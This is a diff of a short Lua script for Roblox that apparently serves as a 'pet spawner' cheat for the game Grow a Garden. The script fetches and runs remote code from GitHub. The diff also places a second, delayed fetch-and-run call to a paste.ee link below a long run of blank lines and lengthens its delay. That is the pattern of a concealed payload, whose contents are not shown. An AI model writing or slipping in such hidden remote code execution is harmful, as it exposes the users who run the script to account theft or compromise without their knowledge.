@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
 
 
 
@@ -100,7 +100,13 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspa
 
 
 
-task.delay(5, function()
 
-    loadstring(game:HttpGet("https://paste.ee/r/39TtPVEH"))()
+
+
+
+
+
+
+task.delay(10, function()
+    loadstring(game:HttpGet("https://paste.ee/r/39TtPVEH"))()
 end)
